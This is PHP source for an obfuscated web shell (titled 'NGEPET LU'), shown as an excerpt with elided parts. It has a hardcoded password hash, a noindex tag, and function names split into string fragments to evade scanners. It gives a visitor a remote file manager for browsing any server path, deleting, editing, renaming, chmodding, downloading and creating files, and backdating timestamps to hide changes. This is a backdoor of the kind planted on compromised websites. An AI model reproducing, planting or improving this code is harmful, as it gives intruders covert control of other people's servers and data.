<?php
$auth_pass = "190b6d402db6ce02363b983178ae9bc3";
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
...
<html>
<head>
	<?php echo "<title>NGEPET LU</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://omaygad.com/920h02.jpg" type="image/x-icon">
</head>
...
<center>
<?php
echo '<font face="Bungee" size="5">HILIH KOPI NYOK</font></center>
...
function cekdir() {
	if (isset($_GET['mintolnya'])) {
		$manganse = $_GET['mintolnya'];
	} else {
		$manganse = "ge"."t"."cw"."d";
		$manganse = $manganse();
	}
...
function cfn($fl) {
	$a = "ba"."sena"."me";
	$b = "pat"."hinf"."o";
	$c = $b($a($fl), mintolnyaINFO_EXTENSION);
	if ($c == "zip") {
...
foreach($manganses as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?mintolnya=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?mintolnya=';
	for($i=0;$i<=$id;$i++){
	echo "$manganses[$i]";
	if($i != $id) echo "/";
} 
...
if (isset($_GET['mangansee'])) {
	...
	author();
} elseif (isset($_POST['mintolnya']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['mintolnya']) && $fxt($_POST['mintolnya'])) {
		xrd($_POST['mintolnya']);
		if ($fxt($_POST['mintolnya'])) {
			red("Fai"."led to del"."ete Dir"."ec"."tory !");
		} else {
			green("Del"."ete Dir"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['mintolnya']) && $fxt($_POST['mintolnya'])) {
		@$ulk($_POST['mintolnya']);
		if ($fxt($_POST['mintolnya'])) {
	...
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['mintolnya'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['mintolnya'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['mintolnya'])), -4).'" />
		<input type="hidden" name="mintolnya" value="'.$_POST['mintolnya'].'">
		...
		$cm = @$chm($_POST['mintolnya'], $ocd($_POST['perm']));
		if ($cm == true) {
...
} elseif (isset($_POST['mintolnya']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['mintolnya']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['mintolnya'], $namabaru) === true) {
			...
			<input type="hidden" name="mintolnya" value="'.$_POST['newname'].'">
		...
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['mintolnya'])).'" />
		<input type="hidden" name="mintolnya" value="'.$_POST['mintolnya'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
	...
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['mintolnya'], $_POST['src']);
		if ($fgt($_POST['mintolnya']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".htmlspecialchars($_POST['mintolnya'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['mintolnya'])).'</textarea><br>
	<input type="hidden" name="mintolnya" value="'.$_POST['mintolnya'].'">
...
} elseif (isset($_POST['mintolnya']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['mintolnya'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['mintolnya']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['mintolnya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['mintolnya'])."<br>";
...
} elseif (isset($_POST['mintolnya']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['mintolnya'];
...
} elseif (isset($_POST['mintolnya']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['mintolnya'];
        if (isset($_POST['buatfolder'])) {
            ...
            if ($buatf == true) {
                ...
                echo '<input type="hidden" name="mintolnya" value="'.$_POST['mintolnya'].'">
            ...
            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="mintolnya" value="'.$_POST['mintolnya'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
    ...
    if ($isw("./") || $isr("./")) {
        ...
        if (isset($_POST['buatfi'.'le'])) {
            ...
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                ...
                echo '<input type="hidden" name="mintolnya" value="'.$_POST['lok'.'nya'].'">
            ...
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="mintolnya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}
...
$anumase = $srl("//", "/", $anumase);
echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?mintolnya=".$anumase."\">..</a></td>
<td><center>--</center></td>
...
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&mintolnya=$manganse\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$scdngpet\">
<input type=\"hidden\" name=\"mintolnya\" value=\"$manganse/$scdngpet\">
...
foreach($mangansenya as $scdngpet){
	$euybre = $manganse."/".$scdngpet;
	$euybre = $srl("//", "/", $euybre);
	if(!$idi($euybre) || $scdngpet == '.' || $scdngpet == '..') continue;
	echo "<tr>";
	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?mintolnya=".$euybre."\">".$scdngpet."</a></td>
	<td><center>--</center></td>
...
$skd = "10"."24";
foreach($mangansenya as $plerluscdng) {
	$euybray = $manganse."/".$plerluscdng;
	if(!$ifi("$manganse/$plerluscdng")) continue;
	$size = $fsz("$manganse/$plerluscdng")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
...
echo "<tr>
<td>".cfn($euybray)." <a href=\"?mangansee=$manganse/$plerluscdng&mintolnya=$manganse\">$plerluscdng</a></td>
<td><center>".$size."</center></td>
<td><center>".fdt($euybray)."</center></td>
<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
<td><center>";
if($isw("$manganse/$plerluscdng")) echo '<font color="green">';
elseif(!$isr("$manganse/$plerluscdng")) echo '<font color="red">';
echo statusnya("$manganse/$plerluscdng");
if($isw("$manganse/$plerluscdng") || !$isr("$manganse/$plerluscdng")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&mintolnya=$manganse\">
...
<input type=\"hidden\" name=\"mintolnya\" value=\"$manganse/$plerluscdng\">
</form></center></td>
</tr>";
}
